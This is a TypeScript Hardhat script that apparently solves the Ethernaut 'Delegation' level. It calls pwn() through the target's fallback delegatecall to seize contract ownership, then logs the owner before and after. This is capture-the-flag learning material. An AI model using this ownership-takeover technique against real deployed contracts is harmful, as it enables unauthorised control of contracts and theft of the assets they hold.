// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
// When running the script with `hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseUnits } from 'ethers/lib/utils';
import { ethers } from 'hardhat';


async function main(): Promise<void> {
  // Hardhat always runs the compile task when running scripts through it.
  // If this runs in a standalone fashion you may want to call compile manually
  // to make sure everything is compiled
  // await run("compile");
  // We get the contract to deploy
  const [deployer, deployer2] = await ethers.getSigners();
  const delegationAddress = "0x8bf7a78840382f7560cf67CAA02086109f116DEb"
  const delegateAddress = "0x9451961b7Aea1Df57bc20CC68D72f662241b5493"

  console.log(deployer.address);
  const delegationFactory = await ethers.getContractFactory("Delegation");
  const delegateFactory = await ethers.getContractFactory("Delegate");
  const delegation = delegationFactory.attach(delegationAddress);
  const delegate = delegateFactory.attach(delegationAddress);
  
  console.log('delegation deployed to: ', delegation.address);

  console.log((await delegation.owner()))
  console.log((await delegate.owner()))

  // calling pwn method on delegation contract does the trick
  // I did not know how to abiencode data in hardhat
  //  so I instantiated the delegation contract address as a delegate contract
  const tx = await delegate.pwn({gasLimit: parseUnits("100000", "1")})
  console.log(tx)
  const receipt = await tx.wait()
  console.log(receipt)

  console.log((await delegation.owner()))
  console.log((await delegate.owner()))
} 

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error: Error) => {
    console.error(error);
    process.exit(1);
  });
